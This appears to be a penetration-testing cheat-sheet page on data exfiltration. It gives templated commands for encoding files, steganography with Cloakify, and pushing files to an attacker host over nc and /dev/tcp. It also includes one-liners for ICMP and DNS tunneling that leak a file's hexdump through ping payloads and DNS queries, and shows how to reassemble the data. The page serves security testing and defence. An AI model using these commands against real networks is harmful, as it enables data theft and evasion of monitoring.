---
menu: Data Exfiltration
title: Data Exfiltration and Protocol Tunneling
weight: 600
---

# Exfiltration

## At a Glance

Data exfiltration,
also called data extrusion or data exportation,
is the unauthorized transfer of data
from a device or network.[^mitre-exfiltration]

## Encoding

### Base64

Linux encoding/decoding.

```sh
cat {{< param "war.tfile" >}} | base64 -w0
```

```sh
cat {{< param "war.tfile" >}} | base64 -d
```

{{<details "Parameters">}}
- `-w<col>`:  wrap encoded lines after `<col>` character (default 76).
- `-d`: decode data.
{{</details>}}

Windows encoding/decoding.

```ps
certutil -encode {{< param "war.tfile" >}} output.ext
```

```ps
certutil -decode {{< param "war.tfile" >}} output.ext
```

### Steganography

#### Cloakify [^cloakify]
```sh
python ./cloakify.py {{< param "war.tfile" >}} ./ciphers/topWebsites
```

Alternatively:

```sh
python ./cloakifyFactory
```

## File Transfer

#### wget (recursive)

```sh
wget -r {{< param "war.rhost" >}}:{{< param "war.lport" >}}
```
{{<details "Parameters">}}
- `-r`: Specify recursive download.
{{</details>}}

#### curl
```sh
curl {{< param "war.rhost" >}}/{{< param "war.tfile" >}} -o {{< param "war.tfile" >}}
```
{{<details "Parameters">}}
- `-o <file>`:  Write to `<file>` instead of stdout.
{{</details>}}

#### scp
```sh
scp user@{{< param "war.rhost" >}}:/{{< param "war.tfile" >}} .
```

#### nc

```sh
# Receiver
nc -nvlp {{< param "war.lport" >}} > {{< param "war.tfile" >}}
# Sender
nc -nv {{< param "war.lhost" >}} {{< param "war.lport" >}} < {{< param "war.tfile" >}}
```

{{<details "Parameters">}}
- `n`: don't do DNS lookups.
- `v`: prints status messages.
- `l`: listen.
- `p <port>`: local port used for listening.
{{</details>}}

#### `/dev/tcp` [^devref]
```sh
# Receiver
nc -nvlp {{< param "war.lport" >}} > {{< param "war.tfile" >}}
# Sender
cat {{< param "war.tfile" >}} > /dev/tcp/{{< param "war.lhost" >}}/{{< param "war.lport" >}}
```

```sh
# Sender
nc -w5 -nvlp {{< param "war.lport" >}} < {{< param "war.tfile" >}}
# Receiver
exec 6< /dev/tcp/{{< param "war.lhost" >}}/{{< param "war.lport" >}}
cat <&6 > {{< param "war.tfile" >}}
```

## Web Servers

### Python

```sh
python -m SimpleHTTPServer {{< param "war.lport" >}}
python3 -m http.server {{< param "war.lport" >}}
```

[Simple HTTP Server with File Upload](https://gist.github.com/touilleMan/eb02ea40b93e52604938)

### Ruby

```sh
ruby -run -e httpd . -p{{< param "war.lport" >}}
```

```sh
ruby -r webrick -e 'WEBrick::HTTPServer.new(:Port => {{< param "war.lport" >}}, :DocumentRoot => Dir.pwd).start'
```

### Perl

```sh
perl -MHTTP::Daemon -e '$d = HTTP::Daemon->new(LocalPort => {{< param "war.lport" >}}) or  +die $!; while($c = $d->accept){while($r = $c->get_request){+$c->send_file_response(".".$r->url->path)}}'
```

{{<note>}}
Install `HTTP:Daemon` if not present with: `sudo cpan HTTP::Daemon`
{{</note>}}

### PHP

```sh
php -S 127.0.0.1:{{< param "war.lport" >}}
```

### NodeJS

[http-server](https://www.npmjs.com/package/http-server)

```sh
npm install -g http-server
http-server -p {{< param "war.lport" >}}
```

[node-static](https://www.npmjs.com/package/node-static)

```sh
npm install -g node-static
static -p {{< param "war.lport" >}}
```

## FTP Servers

### Python

```sh
pip install pyftpdlib
python3 -m pyftpdlib -p {{< param "war.lport" >}}
```

### NodeJS

```sh
npm install -g ftp-srv
ftp-srv ftp://0.0.0.0:{{< param "war.lport" >}} --root ./
```

## Tunneling

### ICMP

Capture ICMP packets
with the following script:

{{<gist maxrodrigo a7a8c4bd7dfe64eb305b4c70dee70233 >}}

Generate ICMP packets from the file hexdump.

```sh
xxd -p -c 8 {{< param "war.tfile" >}} | while read h; do ping -c 1 -p $h {{< param "war.rhost" >}}; done
```

{{<details "Parameters">}}

`xxd`:
- `-p`: Output  in postscript continuous hexdump style. Also known as plain hexdump style.
- `-c <cols>`: Format `<cols>` octets per line.

`ping`:
- `-c <count>`: Stop after sending `<count>` `ECHO_REQUEST` packets.
- `-p`: You may specify up to 16 "pad" bytes to fill out the packet you send.
{{</details>}}

{{<note>}}
Match `xxd` columns (`-c 8`) with the data sliced (`packet[ICMP].load[-8:]`) in the script.
{{</note>}}

### DNS

Capture DNS packets data.

```sh
sudo tcpdump -n -i {{< param "war.liface" >}} -w dns_exfil.pcap udp and src {{< param "war.rhost" >}} and port 53
```

{{<note>}}
Remember to point the DNS resolution to where packages are being captured.
{{</note>}}

Generate DNS queries.

```sh
xxd -p -c 16 {{< param "war.tfile" >}} | while read h; do ping -c 1 ${h}.domain.com; done
```

Extract exfiltrated data.

```sh
tcpdump -r dns-exfil.pcap 2>/dev/null | sed -e 's/.*\ \([A-Za-z0-9+/]*\).domain.com.*/\1/' | uniq | paste -sd "" - | xxd -r -p
```

#### PacketWhisper [^packetwhisper]

Capture packages with `tcpdump`,
as described above.
Cloak, exfiltrate and decloak from the cli.

```sh
sudo packetWhisper.py
```

## Further Reading

- [Python HTTPS Simple Server](https://www.maxrodrigo.com/notes/python-https-simple-server.html)

[^mitre-exfiltration]: “Exfiltration, Tactic TA0010 - Enterprise.” MITRE ATT&CK®, https://attack.mitre.org/tactics/TA0010/.
[^cloakify]: TryCatchHCF. “TryCatchHCF/Cloakify: CloakifyFactory.” GitHub, https://github.com/TryCatchHCF/Cloakify.
[^devref]: “/Dev.” The Linux Documentation Project, https://tldp.org/LDP/abs/html/devref1.html.
[^packetwhisper]: TryCatchHCF. “PacketWhisper.” GitHub, https://github.com/TryCatchHCF/PacketWhisper.
